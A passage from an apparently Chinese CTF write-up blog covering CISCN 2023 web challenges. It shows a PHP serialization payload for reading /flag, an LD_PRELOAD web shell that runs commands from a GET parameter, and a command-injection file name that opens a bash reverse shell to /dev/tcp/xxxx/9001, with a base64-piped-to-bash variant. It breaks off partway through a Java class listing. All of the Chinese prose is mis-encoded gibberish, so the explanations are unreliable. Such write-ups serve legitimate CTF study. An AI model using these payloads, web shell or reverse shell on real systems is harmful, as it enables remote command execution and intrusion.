class="hljs-string">&quot;/f\l\a\g&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœ:</span><br>/fSundayam9<br>/flag<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯å¯¹ç»è¿‡<code>date</code>å‡½æ•°è½¬ä¹‰åæ•°æ®çš„å¤„ç†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>å…ˆåˆ©ç”¨<code>file_put_contents</code>å‡½æ•°æŠŠ<code>$content</code>æ”¾åˆ°ç”Ÿæˆçš„<code>$uuid</code>æ–‡ä»¶ä¸­ï¼Œç„¶ååˆ©ç”¨æ­£åˆ™åŒ¹é…å°†æ–‡ä»¶ä¸­çš„ç©ºç™½å­—ç¬¦å’Œæ¢è¡Œæ›¿æ¢ä¸ºç©ºå­—ç¬¦ï¼Œå†èµ‹å€¼ç»™<code>$data</code>ã€‚æœ€ååˆ©ç”¨<code>file_get_contents</code>å’Œ<code>echo</code>é…åˆè¾“å‡ºã€‚</p><p>æ‰€ä»¥æ„é€ <code>payload</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/f\l\a\g&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">date</span>();<br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$d</span>);<br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯è¿™å‡ ä¸ª<code>file_get_contents</code>å’Œ<code>file_get_contenes</code>çš„ç»„åˆä½¿ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>é¦–å…ˆ<code>$content</code>æˆäº†<code>/flag</code>ï¼Œç„¶åfile_put_contentsæŠŠ&#x2F;<code>flag</code>è¿™ä¸ªå­—ç¬¦ä¸²å†™åˆ°ç›®æ ‡æ–‡ä»¶é‡Œï¼Œç„¶å<code>file_get_contents($uuid)</code>è¿™ä¸œè¥¿æŠŠæ–‡ä»¶å†…å®¹èµ‹å€¼ç»™<code>$data</code>ï¼Œè¿™æ—¶<code>$data</code>æˆäº†<code>/flag</code>ã€‚æœ€åå†åˆ©ç”¨ä¸€ä¸ª<code>file_get_contents</code>å»è¯»<code>/flag</code>çš„å†…å®¹ã€‚</p><h4 id="æ€è·¯æ€»ç»“ï¼š"><a href="#æ€è·¯æ€»ç»“ï¼š" class="headerlink" title="æ€è·¯æ€»ç»“ï¼š"></a>æ€è·¯æ€»ç»“ï¼š</h4><p>PHPä¸­é™¤æ•°ç»„å¤–æ˜¯å¦æœ‰å…¶å®ƒæ–¹æ³•ç»•è¿‡å¼ºç­‰äºï¼Ÿ<code>date</code>å‡½æ•°å¯ä»¥èµ·åˆ°è½¬ä¹‰ä½œç”¨ã€‚</p><h2 id="CISCN-2023-è¥¿å—-do-you-like-read"><a href="#CISCN-2023-è¥¿å—-do-you-like-read" class="headerlink" title="[CISCN 2023 è¥¿å—]do_you_like_read"></a>[CISCN 2023 è¥¿å—]do_you_like_read</h2><p>ä¸‹è½½é™„ä»¶ï¼Œé è¿™ä¹ˆå¤šï¼š</p><p><img src="/img/2023ciscndoulikeread1.png" alt="2023ciscndoulikeread1"></p><p><code>test</code>æ–‡ä»¶å¤¹ä¸‹å­˜åœ¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;<br><br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br>    <span class="hljs-variable">$out_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;outpath&quot;</span>];<br>    <span class="hljs-variable">$evil_cmdline</span> = <span class="hljs-variable">$cmd</span> . <span class="hljs-string">&quot; &gt; &quot;</span> . <span class="hljs-variable">$out_path</span> . <span class="hljs-string">&quot; 2&gt;&amp;1&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="hljs-variable">$evil_cmdline</span> . <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="hljs-variable">$evil_cmdline</span>);<br><br>    <span class="hljs-variable">$so_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;sopath&quot;</span>];<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=&quot;</span> . <span class="hljs-variable">$so_path</span>);<br><br>    <span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . <span class="hljs-title function_ invoke__">nl2br</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$out_path</span>)) . <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>; <br><br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$out_path</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="CISCN-2023-ååŒ—-pysym"><a href="#CISCN-2023-ååŒ—-pysym" class="headerlink" title="[CISCN 2023 ååŒ—]pysym"></a>[CISCN 2023 ååŒ—]pysym</h2><p><code>requirement.txt</code>æç¤º<code>Flask</code></p><p><code>app.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, send_from_directory<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="hljs-string">&#x27;uploads&#x27;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">POST</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No file uploaded.&#x27;</span><br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    <span class="hljs-keyword">if</span> file.content_length &gt; <span class="hljs-number">10240</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;file too lager&#x27;</span><br>    path = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="hljs-number">16</span>))<br>    directory = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)<br>    os.makedirs(directory, mode=<span class="hljs-number">0o755</span>, exist_ok=<span class="hljs-literal">True</span>)<br>    savepath=os.path.join(directory, file.filename)<br>    file.save(savepath)<br>    <span class="hljs-keyword">try</span>:<br>     os.system(<span class="hljs-string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(savepath,directory))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;something wrong in extracting&#x27;</span><br><br>    links = []<br>    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(directory):<br>        <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> files:<br>            extractedfile =os.path.join(root, name)<br>            <span class="hljs-keyword">if</span> os.path.islink(extractedfile):<br>                os.remove(extractedfile)<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no symlink&#x27;</span><br>            <span class="hljs-keyword">if</span>  os.path.isdir(path) :<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no directory&#x27;</span><br>            links.append(extractedfile)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,links=links)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/uploads/&lt;path:path&gt;&quot;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">path</span>):<br>    filepath = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(filepath):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;404&#x27;</span>, <span class="hljs-number">404</span><br>    <span class="hljs-keyword">return</span> send_from_directory(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">1337</span>)<br></code></pre></td></tr></table></figure><p>å¤§è‡´å°±æ˜¯ä¸€ä¸ªå®ç°è§£å‹ç‰¹å®šè·¯å¾„çš„å‹ç¼©åŒ…åˆ°å…¶å®ƒç‰¹å®šè·¯å¾„çš„åŠŸèƒ½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> file.content_length &gt; <span class="hljs-number">10240</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;file too lager&#x27;</span><br>    path = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="hljs-number">16</span>))<br>    directory = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)<br>    os.makedirs(directory, mode=<span class="hljs-number">0o755</span>, exist_ok=<span class="hljs-literal">True</span>)<br>    savepath=os.path.join(directory, file.filename)<br>    file.save(savepath)<br>    <span class="hljs-keyword">try</span>:<br>     os.system(<span class="hljs-string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(savepath,directory))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;something wrong in extracting&#x27;</span><br></code></pre></td></tr></table></figure><p>å…ˆé™åˆ¶äº†æ–‡ä»¶é•¿åº¦ä¸èƒ½å¤§äº<code>10240</code>ï¼Œç„¶ååˆ©ç”¨åå…­ä¸ªéšæœºçš„åå…­è¿›åˆ¶æ•°æ‹¼æ¥æˆ<code>path</code>ã€‚å†åˆ©ç”¨<code>os.path.join</code>æŠŠè¿™ä¸ª<code>path</code>å’Œ<code>app.config[&#39;UPLOAD_FOLDER&#39;]</code>æ‹¼æ¥æˆä¸€ä¸ªå®Œæ•´è·¯å¾„èµ‹å€¼ç»™<code>directory</code>ã€‚<code>savepath</code>åŒä¸Šã€‚ç„¶åè°ƒç”¨<code>os.system</code>ä¸­çš„<code>tar</code>æŠŠç›®æ ‡æ–‡ä»¶è§£å‹åˆ°<code>directory</code>è·¯å¾„ä¸­ã€‚</p><p><code>os.system</code>è¿™ä¸œè¥¿ä¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤<code>filename</code>å¯æ§å¯¼è‡´<code>savepath</code>å¯æ§ã€‚</p><p><a href="https://blog.csdn.net/weixin_44558805/article/details/131456350">å‚è€ƒèµ„æ–™</a></p><p>å¯ä»¥é€šè¿‡æ„é€ <code>xxx.tar||xxxxx</code>æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸è¿‡å•çº¯ä¸€ä¸ª<code>os.system</code>æ˜¯ä¸å­˜åœ¨å›æ˜¾çš„æ‰€ä»¥è€ƒè™‘åå¼¹<code>shell</code>:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">thr</span>.txt || echo bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxxx/<span class="hljs-number">9001</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>&#x27;<br></code></pre></td></tr></table></figure><p>ä½†æ³¨æ„<code>savepath</code>ä¸­ä¸èƒ½åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼Œbase64åŠ å¯†ä¸€ä¸‹å°±è¡Œï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">echo xxxxxxx|<span class="hljs-string"> base64 -d </span>|<span class="hljs-string"> bash </span>|<br></code></pre></td></tr></table></figure><p>æœ€ååŠ ä¸¤ä¸ª<code>|</code>é—­åˆä¹Ÿè¡Œï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">echo xxxxxxx|<span class="hljs-string"> base64 -d </span>|<span class="hljs-string"> bash </span>||<br></code></pre></td></tr></table></figure><h4 id="æ€è·¯æ€»ç»“ï¼š-1"><a href="#æ€è·¯æ€»ç»“ï¼š-1" class="headerlink" title="æ€è·¯æ€»ç»“ï¼š"></a>æ€è·¯æ€»ç»“ï¼š</h4><p><code>os.system</code>å‘½ä»¤ï¼Ÿæ˜¯å¦æœ‰å›æ˜¾ï¼Ÿä»¥åŠå¯¹äºï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(savepath,<span class="hljs-built_in">directory</span>))<br></code></pre></td></tr></table></figure><p>æ˜¯å¦å¯ä»¥è€ƒè™‘å‘½ä»¤æ³¨å…¥ï¼Ÿ</p><h2 id="CISCN-2023-åˆèµ›-DeserBug"><a href="#CISCN-2023-åˆèµ›-DeserBug" class="headerlink" title="[CISCN 2023 åˆèµ›]DeserBug"></a>[CISCN 2023 åˆèµ›]DeserBug</h2><p>é¢˜ç›®ç»™äº†é™„ä»¶ï¼Œ<code>jar-gui</code>æ‰“å¼€ï¼š</p>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTFåšé¢˜è®°å½•_9</title>
    <link href="/2024/01/10/2023-12-28-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_9/"/>
    <url>/2024/01/10/2023-12-28-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_9/</url>
    
    <content type="html"><![CDATA[<p>åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Think-Java-æœªåšå®Œ"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Think-Java-æœªåšå®Œ" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Think Java(æœªåšå®Œ)"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Think Java(æœªåšå®Œ)</h2><p>å‡ ä¸ªé™„ä»¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Row.class</span><br><span class="hljs-keyword">package</span> cn.abc.core.sqldict;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Row</span> &#123;<br>    String name;<br>    String type;<br>    String def;<br>    String isNull;<br>    String isAuto;<br>    String remark;<br>    String isPK;<br>    String size;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getIsPK</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.isPK;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setIsPK</span><span class="hljs-params">(String isPK)</span> &#123;<br>        <span class="hljs-built_in">this</span>.isPK = isPK;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.type;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setType</span><span class="hljs-params">(String type)</span> &#123;<br>        <span class="hljs-built_in">this</span>.type = type;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDef</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.def;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDef</span><span class="hljs-params">(String def)</span> &#123;<br>        <span class="hljs-built_in">this</span>.def = def;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getIsNull</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.isNull;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setIsNull</span><span class="hljs-params">(String isNull)</span> &#123;<br>        <span class="hljs-built_in">this</span>.isNull = isNull;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getIsAuto</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.isAuto;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setIsAuto</span><span class="hljs-params">(String isAuto)</span> &#123;<br>        <span class="hljs-built_in">this</span>.isAuto = isAuto;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRemark</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.remark;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRemark</span><span class="hljs-params">(String remark)</span> &#123;<br>        <span class="hljs-built_in">this</span>.remark = remark;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getSize</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.size;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSize</span><span class="hljs-params">(String size)</span> &#123;<br>        <span class="hljs-built_in">this</span>.size = size;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Row</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Row</span><span class="hljs-params">(String name, String type, String def, String 